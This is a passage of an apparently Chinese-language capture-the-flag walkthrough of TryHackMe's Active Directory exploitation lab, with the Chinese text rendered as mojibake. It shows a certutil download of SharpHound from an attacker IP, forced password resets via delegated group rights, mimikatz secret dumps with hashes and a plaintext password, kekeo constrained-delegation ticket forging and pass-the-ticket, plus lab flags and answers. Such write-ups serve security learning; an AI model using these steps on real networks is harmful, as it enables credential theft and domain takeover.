# å‰ç½®ä»£ç†

è¿™ä¸ªæˆ¿é—´æˆ‘åœ¨æœ¬åœ°æ— æ³•ç›´è¿žvpnï¼Œéœ€è¦åŠ å‰ç½®ä»£ç†

## ssh
åªèƒ½è½¬å‘tcp

sshåŠ¨æ€ç»‘å®šæœ¬åœ°è½¬å‘ç«¯å£
```
ssh -N -D 127.0.0.1:9050 root@xxxx
```
åœ¨ovpnæœ€å‰é¢åŠ è¿™ä¸¤è¡Œ
```
socks-proxy 127.0.0.1 9050
route t3.50redlight.com 255.255.255.255 net_gateway
```

# kalié…ç½®DNS

é…ç½®DNSæ–‡ä»¶
```
vim /etc/resolv.conf 
```

ä¸Šé¢é…ç½®æ–‡ä»¶å¡«å…¥ä»¥ä¸‹å†…å®¹
```
nameserver 10.200.83.101     #THMDCçš„ip
nameserver 114.114.114.114   #çœŸå®žçš„DNSåœ°å€ï¼Œä»¥ä¿è¯kaliè¿˜èƒ½è¿žæŽ¥ç½‘ç»œ
```

é‡å¯ç½‘ç»œ
```
systemctl restart systemd-resolved
```

éªŒè¯
```
â”Œâ”€â”€(rootðŸ’€kali)-[~]
â””â”€# nslookup thmdc.za.tryhackme.loc
Server:         10.200.83.101
Address:        10.200.83.101#53

Name:   thmdc.za.tryhackme.loc
Address: 10.200.83.101

```

# èŽ·å–ç”¨æˆ·å‡­æ®

ç™»å½•```http://distributor.za.tryhackme.loc/creds```ç”Ÿæˆä¸€ä¸ªç”¨æˆ·ç™»å½•å‡­æ®

```
Your credentials have been generated: Username: max.smith Password: Kdbt1458
```

sshç™»å½•
```
ssh za.tryhackme.loc\\max.smith@thmwrk1.za.tryhackme.loc
```

# Task 2  Exploiting Permission Delegation


ACE

**ForceChangePassword**ï¼šæˆ‘ä»¬å¯ä»¥åœ¨ä¸çŸ¥é“ç”¨æˆ·å½“å‰å¯†ç çš„æƒ…å†µä¸‹è®¾ç½®ç”¨æˆ·å½“å‰å¯†ç ã€‚
**AddMembers**ï¼šæˆ‘ä»¬æœ‰èƒ½åŠ›å°†ç”¨æˆ·ï¼ˆåŒ…æ‹¬æˆ‘ä»¬è‡ªå·±çš„å¸æˆ·ï¼‰ã€ç»„æˆ–è®¡ç®—æœºæ·»åŠ åˆ°ç›®æ ‡ç»„ã€‚
**GenericAll**ï¼šæˆ‘ä»¬å¯ä»¥å®Œå…¨æŽ§åˆ¶å¯¹è±¡ï¼ŒåŒ…æ‹¬æ›´æ”¹ç”¨æˆ·å¯†ç ã€æ³¨å†Œ SPN æˆ–å°† AD å¯¹è±¡æ·»åŠ åˆ°ç›®æ ‡ç»„çš„èƒ½åŠ›ã€‚
**GenericWrite**ï¼šæˆ‘ä»¬å¯ä»¥æ›´æ–°ç›®æ ‡å¯¹è±¡çš„ä»»ä½•éžä¿æŠ¤å‚æ•°ã€‚ä¾‹å¦‚ï¼Œè¿™å¯ä»¥è®©æˆ‘ä»¬æ›´æ–° scriptPath å‚æ•°ï¼Œè¿™å°†å¯¼è‡´è„šæœ¬åœ¨ç”¨æˆ·ä¸‹æ¬¡ç™»å½•æ—¶æ‰§è¡Œã€‚
**WriteOwner**ï¼šæˆ‘ä»¬æœ‰èƒ½åŠ›æ›´æ–°ç›®æ ‡å¯¹è±¡çš„æ‰€æœ‰è€…ã€‚æˆ‘ä»¬å¯ä»¥è®©è‡ªå·±æˆä¸ºæ‰€æœ‰è€…ï¼Œä»Žè€ŒèŽ·å¾—å¯¹è¯¥å¯¹è±¡çš„é¢å¤–æƒé™ã€‚
**WriteDACL**ï¼šæˆ‘ä»¬æœ‰èƒ½åŠ›å°†æ–°çš„ ACE å†™å…¥ç›®æ ‡å¯¹è±¡çš„DACLã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€ä¸ª ACEï¼ŒæŽˆäºˆæˆ‘ä»¬çš„å¸æˆ·å¯¹ç›®æ ‡å¯¹è±¡çš„å®Œå…¨æŽ§åˆ¶æƒã€‚
**AllExtendedRights**ï¼šæˆ‘ä»¬èƒ½å¤Ÿé’ˆå¯¹ç›®æ ‡å¯¹è±¡æ‰§è¡Œä¸Žæ‰©å±• AD æƒé™ç›¸å…³çš„ä»»ä½•æ“ä½œã€‚ä¾‹å¦‚ï¼Œè¿™åŒ…æ‹¬å¼ºåˆ¶æ›´æ”¹ç”¨æˆ·å¯†ç çš„èƒ½åŠ›ã€‚


thmæä¾›çš„jsonæˆ‘æœ¬åœ°æ— æ³•è¯†åˆ«ï¼Œé‡æ–°æ”¶é›†ä¸€ä»½
```
PS C:\Users\max.smith\Documents> certutil -urlcache -split -f "http://10.50.81.218/SharpHound.exe" SharpHound.exe   
****  Online  ****
  000000  ...
CertUtil: -URLCache command completed successfully.
PS C:\Users\max.smith\Documents> .\SharpHound.exe -c all
-----------------------------------------------
Initializing SharpHound at 9:43 AM on 8/11/2022
-----------------------------------------------

Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container


[+] Creating Schema map for domain ZA.TRYHACKME.LOC using path CN=Schema,CN=Configuration,DC=ZA,DC=TRYHACKME,DC=LOC 
[+] Cache File not Found: 0 Objects in cache

[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 17 MB RAM
[+] Creating Schema map for domain TRYHACKME.LOC using path CN=Schema,CN=Configuration,DC=TRYHACKME,DC=LOC
Status: 5128 objects finished (+5128 512.8)/s -- Using 58 MB RAM
Enumeration finished in 00:00:10.7635721
Compressing data to .\20220811094325_BloodHound.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 9:43 AM on 8/11/2022! Happy Graphing!

PS C:\Users\max.smith\Documents> ls


    Directory: C:\Users\max.smith\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/11/2022   9:43 AM         307482 20220811094325_BloodHound.zip
-a----        8/11/2022   9:42 AM         833536 SharpHound.exe
-a----        8/11/2022   9:43 AM        1092647 Y2Y1YjhlMjMtNjA5Ny00YjA5LWFmOTMtZTc5YjA1NTU3YzNm.bin


```


æ‹·è´å›žkali
```
â”Œâ”€â”€(rootðŸ’€kali)-[~/tryhackme/ExploitingActiveDirectory]
â””â”€# scp za.tryhackme.loc\\max.smith@thmwrk1.za.tryhackme.loc:C:/Users/max.smith/Documents/20220811094325_BloodHound.zip .
za.tryhackme.loc\max.smith@thmwrk1.za.tryhackme.loc's password: 
20220811092711_BloodHound.zip   
```

ä»Žæœ¬ç”¨æˆ·åˆ°```TIER 2 ADMINS```çš„ä¸€æ¡æ”»å‡»è·¯å¾„


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660208864433.jpg)


æœ¬ç”¨æˆ·ï¼ˆmaxï¼‰å±žäºŽ```Domain users```ç”¨æˆ·ç»„

```Domain users```ç”¨æˆ·ç»„å¯ä»¥æ·»åŠ ä»»ä½•æˆå‘˜åˆ°```IT SUPPORT```ç”¨æˆ·ç»„

```IT SUPPORT```ç”¨æˆ·ç»„å¯ä»¥å¼ºåˆ¶æ›´æ”¹ç”¨æˆ·```T2_HENRY.HARVEY```çš„å¯†ç 

ç”¨æˆ·```T2_HENRY.HARVEY```å±žäºŽ```TIER 2 ADMINS```ç”¨æˆ·ç»„



é¦–å…ˆï¼Œå°†å½“å‰è´¦å·æ·»åŠ è¿›```IT Support```ç”¨æˆ·ç»„ï¼Œç„¶åŽç”¨Get-ADGroupMemberéªŒè¯æ·»åŠ ç»“æžœ
```
PS C:\> Add-ADGroupMember "IT Support" -Members "max.smith"
PS C:\> Get-ADGroupMember -Identity "IT Support"

...
...
distinguishedName : CN=max.smith,OU=IT,OU=People,DC=za,DC=tryhackme,DC=loc 
name              : max.smith
objectClass       : user
objectGUID        : f0cd5ecd-6a42-4eff-8015-071e1dc3747b
SamAccountName    : max.smith
SID               : S-1-5-21-3885271727-2693558621-2658995185-1142

```


èŽ·å–"Tier 2 Admins"ç»„æˆå‘˜ï¼Œçœ‹åˆ°æœ‰t2_henry.harveyçš„ä¿¡æ¯
```
PS C:\> Get-ADGroupMember -Identity "Tier 2 Admins"

...
...

distinguishedName : CN=t2_henry.harvey,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc 
name              : t2_henry.harvey
objectClass       : user
objectGUID        : a3c2db31-6362-4af7-8a3e-20e0c16a664f
SamAccountName    : t2_henry.harvey
SID               : S-1-5-21-3885271727-2693558621-2658995185-4275

```


å¼ºåˆ¶ä¿®æ”¹å¯†ç ,æŠ¥é”™æŠ¥Access is denied
```
PS C:\> $Password = ConvertTo-SecureString "max.123456" -AsPlainText -Force 
PS C:\> Set-ADAccountPassword -Identity "t2_henry.harvey" -Reset -NewPassword $Password               
Set-ADAccountPassword : Access is denied 
At line:1 char:1
+ Set-ADAccountPassword -Identity "t2_henry.harvey" -Reset -NewPassword ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (t2_henry.harvey:ADAccount) [Set-ADAccountPassword], UnauthorizedA  
   ccessException
    + FullyQualifiedErrorId : ActiveDirectoryCmdlet:System.UnauthorizedAccessException,Microsoft.ActiveDirectory.M  
   anagement.Commands.SetADAccountPassword

```

æ•™ç¨‹è¯´éœ€è¦ç­‰10åˆ†é’Ÿæ–­å¼€å†è¿žsshæµ‹è¯•,åŽŸå› æ˜¯ï¼š

> æƒé™å°šæœªé€šè¿‡åŸŸä¼ æ’­ã€‚è¿™æœ€å¤šå¯èƒ½éœ€è¦ 10 åˆ†é’Ÿã€‚æœ€å¥½çš„æ–¹æ³•æ˜¯ç»ˆæ­¢æ‚¨çš„ SSH æˆ–RDPä¼šè¯ï¼Œç¨ä½œä¼‘æ¯ï¼Œç„¶åŽé‡æ–°éªŒè¯å¹¶é‡è¯•ã€‚æ‚¨ä¹Ÿå¯ä»¥è¿è¡Œgpupdate /forceç„¶åŽæ–­å¼€è¿žæŽ¥å¹¶é‡æ–°è¿žæŽ¥ï¼Œè¿™åœ¨æŸäº›æƒ…å†µä¸‹ä¼šå¯¼è‡´åŒæ­¥å‘ç”Ÿå¾—æ›´å¿«

å‡ åˆ†é’ŸåŽå†æ¬¡ä¿®æ”¹ï¼Œä¿®æ”¹æˆåŠŸ
```
PS C:\Users\max.smith> $Password = ConvertTo-SecureString "max.123456" -AsPlainText -Force
PS C:\Users\max.smith> Set-ADAccountPassword -Identity "t2_henry.harvey" -Reset -NewPassword $Password
PS C:\Users\max.smith>  

```

çŽ°åœ¨å¯ä»¥é€šè¿‡```t2_henry.harvey:max.123456```ç™»å½•ssh
```
â”Œâ”€â”€(rootðŸ’€kali)-[~/tryhackme/ExploitingActiveDirectory]
â””â”€# ssh za.tryhackme.loc\\t2_henry.harvey@thmwrk1.za.tryhackme.loc
za.tryhackme.loc\t2_henry.harvey@thmwrk1.za.tryhackme.loc's password: 

Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

za\t2_henry.harvey@THMWRK1 C:\Users\t2_henry.harvey>whoami
za\t2_henry.harvey

za\t2_henry.harvey@THMWRK1 C:\Users\t2_henry.harvey>hostname
THMWRK1

za\t2_henry.harvey@THMWRK1 C:\Users\t2_henry.harvey>

```

> Which ACE would allow you to update any non-protected parameter of a target object?

> GenericWrite

> What is the value of the flag stored on the Desktop of the Administrator user on THMWRK1 (flag1.txt)?

> THM{Permission.Delegation.FTW!}

# Task 3  Exploiting Kerberos Delegation

## å¯ä»¥å§”æ´¾çš„æœåŠ¡ç±»åž‹

**HTTP** - Used for web applications to allow pass-through authentication using AD credentials.ï¼ˆç”¨äºŽ Web åº”ç”¨ç¨‹åºä»¥å…è®¸ä½¿ç”¨ AD å‡­æ®è¿›è¡Œç›´é€šèº«ä»½éªŒè¯ï¼‰
**CIFS** - Common Internet File System is used for file sharing that allows delegation of users to shares.ï¼ˆé€šç”¨ Internet æ–‡ä»¶ç³»ç»Ÿç”¨äºŽæ–‡ä»¶å…±äº«ï¼Œå…è®¸ç”¨æˆ·å§”æ´¾å…±äº«ï¼‰
**LDAP** - Used to delegate to the LDAP service for actions such as resetting a user's password.ï¼ˆç”¨äºŽå§”æ‰˜ LDAP æœåŠ¡æ‰§è¡Œæ“ä½œï¼Œä¾‹å¦‚é‡ç½®ç”¨æˆ·å¯†ç ï¼‰
**HOST** - Allows delegation of account for all activities on the host.(å…è®¸ä¸ºä¸»æœºä¸Šçš„æ‰€æœ‰æ´»åŠ¨å§”æ´¾å¸æˆ·)
**MSSQL** - Allows delegation of user accounts to the SQL service for pass-through authentication to databases.(å…è®¸å°†ç”¨æˆ·å¸æˆ·å§”æ´¾ç»™ SQL æœåŠ¡ï¼Œä»¥å¯¹æ•°æ®åº“è¿›è¡Œç›´é€šèº«ä»½éªŒè¯ã€‚)

## çº¦æŸå§”æ´¾åˆ©ç”¨

æžšä¸¾çº¦æŸå§”æ´¾
```
PS C:\> Import-Module C:\Tools\PowerView.ps1 
PS C:\> Get-NetUser -TrustedToAuth 


logoncount               : 34
badpasswordtime          : 8/11/2022 1:52:18 PM
distinguishedname        : CN=IIS Server,CN=Users,DC=za,DC=tryhackme,DC=loc
objectclass              : {top, person, organizationalPerson, user}
displayname              : IIS Server
lastlogontimestamp       : 8/11/2022 12:23:51 PM
userprincipalname        : svcIIS@za.tryhackme.loc
name                     : IIS Server
objectsid                : S-1-5-21-3885271727-2693558621-2658995185-6155
samaccountname           : svcIIS
codepage                 : 0
samaccounttype           : USER_OBJECT
accountexpires           : NEVER
countrycode              : 0
whenchanged              : 8/11/2022 11:23:51 AM
instancetype             : 4
usncreated               : 78494
objectguid               : 11e42287-0a25-4d73-800d-b62e2d2a2a4b
sn                       : Server
lastlogoff               : 1/1/1601 12:00:00 AM
msds-allowedtodelegateto : {WSMAN/THMSERVER1.za.tryhackme.loc, WSMAN/THMSERVER1, http/THMSERVER1.za.tryhackme.loc,  
                           http/THMSERVER1}
objectcategory           : CN=Person,CN=Schema,CN=Configuration,DC=tryhackme,DC=loc
dscorepropagationdata    : 1/1/1601 12:00:00 AM
serviceprincipalname     : HTTP/svcServWeb.za.tryhackme.loc
givenname                : IIS
lastlogon                : 8/12/2022 2:26:43 AM
badpwdcount              : 0
cn                       : IIS Server 
useraccountcontrol       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
whencreated              : 4/27/2022 11:26:21 AM
primarygroupid           : 513
pwdlastset               : 4/29/2022 11:50:25 AM
usnchanged               : 147551

```

 svcIIS å¸æˆ·å¯ä»¥å§”æ‰˜ THMSERVER1 ä¸Šçš„HTTPå’Œ WSMAN æœåŠ¡


å› ä¸ºä¸Šé¢å¾—åˆ°çš„t2_henry.harveyæ˜¯æœ¬åœ°ç®¡ç†å‘˜ï¼Œå¯ä»¥å¯¼å‡ºæœ¬åœ°å“ˆå¸Œå¯†ç 
```
PS C:\> C:\Tools\mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53  
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                   
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )  
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz                   
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/ 

mimikatz # token::elevate 
Token Id  : 0 
User name :   
SID name  : NT AUTHORITY\SYSTEM 

488     {0;000003e7} 1 D 17550          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary 
 -> Impersonated !                                                                                      
 * Process Token : {0;001c4448} 0 D 2471194     ZA\t2_henry.harvey      S-1-5-21-3885271727-2693558621-2658995185-4275  (12g,24p)       Primary 
 * Thread Token  : {0;000003e7} 1 D 2503814     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)              
                                                                                                                                   
mimikatz # lsadump::secrets                                                                                                        
Domain : THMWRK1 
SysKey : a1403e57976b472bce5f231922ca3942

Local name : THMWRK1 ( S-1-5-21-3226461851-763325627-4205969673 ) 
Domain name : ZA ( S-1-5-21-3885271727-2693558621-2658995185 )
Domain FQDN : za.tryhackme.loc 

Policy subsystem is : 1.18
LSA Key(s) : 1, default {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27}
  [00] {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27} 929bd1cdc726d31f5eea6fa5266a09521afd0be6309a08fd604c9a95c2af4463 

Secret  : $MACHINE.ACC
cur/text: 0FFIKa"c[#L6T>=.s*ZW'Gz04FL&7,"VjxxhLeXqmI\%Q%c..g?=olZZlnTA#J@;*8+&?neR%>l_W!w&.oz@1MDJHs`&suI rmg,g GQsb%),mlWLo?6$kqP
    NTLM:4207d1b7e4b942da2371174b772fdf5e
    SHA1:c67c43d5a5d002f67371024ef1aa22db76ab44db 
old/text: 0FFIKa"c[#L6T>=.s*ZW'Gz04FL&7,"VjxxhLeXqmI\%Q%c..g?=olZZlnTA#J@;*8+&?neR%>l_W!w&.oz@1MDJHs`&suI rmg,g GQsb%),mlWLo?6$kqP
    NTLM:4207d1b7e4b942da2371174b772fdf5e 
    SHA1:c67c43d5a5d002f67371024ef1aa22db76ab44db

Secret  : DefaultPassword
old/text: vagrant

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 b6 54 c4 83 d9 88 10 f6 ee ae fc b7 ed 2d a2 d6 47 11 3f 8f 4a 6d 7f 72 35 b8 a2 93 3d 5c 5e 3f 03 8d 79 49 90 e7 2e e0  
    full: b654c483d98810f6eeaefcb7ed2da2d647113f8f4a6d7f7235b8a2933d5c5e3f038d794990e72ee0 
    m/u : b654c483d98810f6eeaefcb7ed2da2d647113f8f / 4a6d7f7235b8a2933d5c5e3f038d794990e72ee0 
old/hex : 01 00 00 00 10 4d a3 82 e2 da 30 1f 33 d6 49 a4 c9 81 26 e5 25 59 bb 9f 8a 76 b1 5d 59 c6 87 c6 32 b7 02 0b c1 5b 24 f4 44 d0 74 31  
    full: 104da382e2da301f33d649a4c98126e52559bb9f8a76b15d59c687c632b7020bc15b24f444d07431
    m/u : 104da382e2da301f33d649a4c98126e52559bb9f / 8a76b15d59c687c632b7020bc15b24f444d07431 

Secret  : NL$KM
cur/hex : 10 bb 99 02 da 94 4a 26 cd ad 07 f3 62 64 53 5c a8 12 be e3 16 1f 8f 99 ae ab 97 37 c4 bc ee df 63 7c 2f 6d 07 c5 d9 5e 29 e7 ce ce 48 52 47 19 8a 03 99 ff 9
7 ec 7f 49 a1 79 15 d9 a0 04 ac 58  
old/hex : 10 bb 99 02 da 94 4a 26 cd ad 07 f3 62 64 53 5c a8 12 be e3 16 1f 8f 99 ae ab 97 37 c4 bc ee df 63 7c 2f 6d 07 c5 d9 5e 29 e7 ce ce 48 52 47 19 8a 03 99 ff 9
7 ec 7f 49 a1 79 15 d9 a0 04 ac 58

Secret  : _SC_thmwinauth / service 'thmwinauth' with username : svcIIS@za.tryhackme.loc
cur/text: Password1@

```

æ˜Žæ–‡å¯†ç ï¼šPassword1@



æ ¹æ®ä¸Šé¢çš„æ˜Žæ–‡å¯†ç ï¼Œä½¿ç”¨kekeoç”Ÿæˆtgt
```
PS C:\> C:\Tools\kekeo\x64\kekeo.exe                                                                                               

  ___ _    kekeo 2.1 (x64) built on Dec 14 2021 11:51:55
 /   ('>-  "A La Vie, A L'Amour"
 | K  |    /* * *
 \____/     Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
  L\_       https://blog.gentilkiwi.com/kekeo                (oe.eo)
                                             with 10 modules * * */

kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@
Realm        : za.tryhackme.loc (za)
User         : svcIIS (svcIIS)
CName        : svcIIS   [KRB_NT_PRINCIPAL (1)]
SName        : krbtgt/za.tryhackme.loc  [KRB_NT_SRV_INST (2)]
Need PAC     : Yes
Auth mode    : ENCRYPTION KEY 23 (rc4_hmac_nt      ): 43460d636f269c709b20049cee36ae7a
[kdc] name: THMDC.za.tryhackme.loc (auto)
  > Ticket in file 'TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'

```

çœ‹è§ç”Ÿæˆäº†ä¸€å¼ tgt

```
TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
```

æ ¹æ®ä¸Šé¢çš„tgtï¼Œè¯·æ±‚tgs

å‚æ•°è¯´æ˜Ž
- tgt - æˆ‘ä»¬æä¾›åœ¨ä¸Šä¸€æ­¥ä¸­ç”Ÿæˆçš„TGT ã€‚
- user - æˆ‘ä»¬è¦æ¨¡æ‹Ÿçš„ç”¨æˆ·ã€‚ç”±äºŽ t2_ å¸æˆ·å¯¹å·¥ä½œç«™å…·æœ‰ç®¡ç†è®¿é—®æƒé™ï¼Œå› æ­¤å¯ä»¥å®‰å…¨åœ°å‡è®¾ t1_ å¸æˆ·å¯¹æœåŠ¡å™¨å…·æœ‰ç®¡ç†è®¿é—®æƒé™ï¼Œå› æ­¤è¯·é€‰æ‹©æ‚¨è¦æ¨¡æ‹Ÿçš„ t1_ å¸æˆ·ã€‚
- service - æˆ‘ä»¬è¦ä½¿ç”¨å§”æ‰˜æ¥æ¨¡æ‹Ÿçš„æœåŠ¡ã€‚æˆ‘ä»¬é¦–å…ˆä¸ºHTTPæœåŠ¡ç”Ÿæˆä¸€ä¸ª TGS ã€‚ç„¶åŽæˆ‘ä»¬å¯ä»¥ä¸º WSMAN æœåŠ¡é‡æ–°è¿è¡Œç›¸åŒçš„å‘½ä»¤ã€‚

```
kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:htt
p/THMSERVER1.za.tryhackme.loc
Ticket  : TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
  [krb-cred]     S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC
  [krb-cred]     E: [00000012] aes256_hmac
  [enc-krb-cred] P: svcIIS @ ZA.TRYHACKME.LOC
  [enc-krb-cred] S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC
  [enc-krb-cred] T: [8/12/2022 5:26:27 AM ; 8/12/2022 3:26:27 PM] {R:8/19/2022 5:26:27 AM}
  [enc-krb-cred] F: [40e10000] name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): cbf2869f6ee1b270c02f3357441243e499dbe707779e9fb3fa2bd540637dfb8a
  [s4u2self]  t1_trevor.jones
[kdc] name: THMDC.za.tryhackme.loc (auto)
[kdc] addr: 10.200.83.101 (auto)
  > Ticket in file 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC.kirbi'
Service(s):
  [s4u2proxy] http/THMSERVER1.za.tryhackme.loc
  > Ticket in file 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'

```

ç”±ç»“æžœå¯è§ç”Ÿæˆäº†ä¸¤å¼ tgs
```
TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC.kirbi
TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
```

ç”¨mimikatzå¯¼å…¥ä¸Šé¢çš„ä¸¤å¼ tgs,ç„¶åŽé€€å‡ºmimikatz

```
PS C:\> C:\Tools\mimikatz_trunk\x64\mimikatz.exe                                                                                                                             
  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
Privilege '20' OK
 
* File: 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi': OK

mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC.kirbi

* File: 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC.kirbi': OK

mimikatz # exit
Bye!

```


ä½¿ç”¨klistæŸ¥çœ‹å¯¼å…¥çš„tgs
```
PS C:\> klist
Current LogonId is 0:0x1c4448

Cached Tickets: (2)

        Server: svcIIS @ ZA.TRYHACKME.LOC
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 8/12/2022 5:30:42 (local)
        End Time:   8/12/2022 15:26:27 (local)
        Renew Time: 8/19/2022 5:26:27 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:

#1>     Client: t1_trevor.jones @ ZA.TRYHACKME.LOC
        Server: http/THMSERVER1.za.tryhackme.loc @ ZA.TRYHACKME.LOC
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 8/12/2022 5:30:42 (local)
        End Time:   8/12/2022 15:26:27 (local)
        Renew Time: 8/19/2022 5:26:27 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:

```


åœ¨å½“å‰tgsçš„ä¸Šä¸‹æ–‡ä¸­å»ºç«‹ä¸€ä¸ªthmserver1çš„session
```
PS C:\> New-PSSession -ComputerName thmserver1.za.tryhackme.loc

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          thmserver1.z... RemoteMachine   Opened        Microsoft.PowerShell     Available


PS C:\> Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
[thmserver1.za.tryhackme.loc]: PS C:\Users\t1_trevor.jones\Documents> whoami
za\t1_trevor.jones
[thmserver1.za.tryhackme.loc]: PS C:\Users\t1_trevor.jones\Documents> cd c:/users/administrator/desktop
[thmserver1.za.tryhackme.loc]: PS C:\users\administrator\desktop> ls


    Directory: C:\users\administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/30/2022   2:10 PM             92 flag2.txt

```

flag
```
[thmserver1.za.tryhackme.loc]: PS C:\users\administrator\desktop> type flag2.txt
THM{Constrained.Delegation.Can.Be.Very.Bad} 
```

> Which Kerberos Delegation type allows for delegation of all services?

> Unconstrained Delegation

> Which Kerberos Delegation type allows the service to specify who is allowed to delegate to it?

> Resource-Based Constrained Delegation

> Which Constrained Delegation service allows access to the file system of the system via delegation?

> CIFS

> What is the value of the flag stored in the Desktop directory of the Administrator user on THMSERVER1 (flag2.txt)?

> THM{Constrained.Delegation.Can.Be.Very.Bad}

# Task 4  Exploiting Automated Relays

## The Printer Bug

åˆ©ç”¨æ¡ä»¶

1. A valid set of AD account credentials.ï¼ˆä¸€ç»„æœ‰æ•ˆçš„ AD å¸æˆ·å‡­æ®ã€‚ï¼‰
2. Network connectivity to the target's SMB service.ï¼ˆä¸Žç›®æ ‡çš„ SMB æœåŠ¡çš„ç½‘ç»œè¿žæŽ¥ã€‚ï¼‰
3. The target host must be running the Print Spooler service.ï¼ˆç›®æ ‡ä¸»æœºå¿…é¡»è¿è¡Œ Print Spooler æœåŠ¡ã€‚ï¼‰
4. The hosts must not have SMB signing enforced.ï¼ˆä¸»æœºä¸å¾—å¼ºåˆ¶æ‰§è¡Œ SMB ç­¾åã€‚ï¼‰


WMI æŸ¥è¯¢ç›®æ ‡ä¸»æœºæœ‰æ²¡æœ‰å¼€å¯Print Spooler æœåŠ¡ã€‚

```
PS C:\> hostname
THMWRK1
PS C:\> GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc 


Location      :  
Name          : Microsoft XPS Document Writer
PrinterState  : 0
PrinterStatus : 3
ShareName     :
SystemName    : THMSERVER2

Location      :
Name          : Microsoft Print to PDF
PrinterState  : 0
PrinterStatus : 3
ShareName     :
SystemName    : THMSERVER2

```

## SMB Signingï¼ˆSMB ç­¾åï¼‰

nmapæ‰«æ thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.locä¸¤å°ä¸»æœºæ˜¯å¦å¼€å¯äº†smbå¼ºåˆ¶ç­¾å

```
â”Œâ”€â”€(rootðŸ’€kali)-[~/tryhackme/ExploitingActiveDirectory]
â””â”€# nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-12 02:26 EDT
Nmap scan report for thmserver1.za.tryhackme.loc (10.200.83.201)
Host is up (0.58s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Nmap scan report for thmserver2.za.tryhackme.loc (10.200.83.202)
Host is up (0.33s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   3.1.1: 
